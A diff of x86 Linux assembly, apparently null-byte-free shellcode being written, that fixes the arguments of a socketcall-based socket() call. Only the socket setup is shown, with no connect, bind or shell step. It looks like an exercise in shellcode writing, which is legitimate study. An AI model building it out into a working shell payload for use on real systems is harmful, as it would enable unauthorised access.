@@ -9,6 +9,7 @@ _start:
 	; Make not null character "\00"
 	xor eax, eax
 	mov ebx, eax
+    mov esi, eax
 
 	; esi = edi = 0. Can use like constant
 
@@ -17,8 +18,8 @@ _start:
 	mov al, 0x66	; SYS_SOCKETCALL = 102
 	mov bl, 0x1		; First argument of socketcall(), ==1 mean SYS_SOCKET
 	push esi		; Third argument of socket(AF_INET, SOCK_STREAM, 0)
-	push 0x1		; Second argument. SOCK_STREAM == 2
-	push 0x2		; First argument. AF_INET == 1. Top of stack == 2
+	push ebx		; Second argument. SOCK_STREAM == 1
+	push 0x2		; First argument. AF_INET == 2. Top of stack == 2
 	mov ecx, esp	; Store address of this arguments to ecx
 	int 0x80
 	mov edx, eax	; Store sockfd to re-use. 
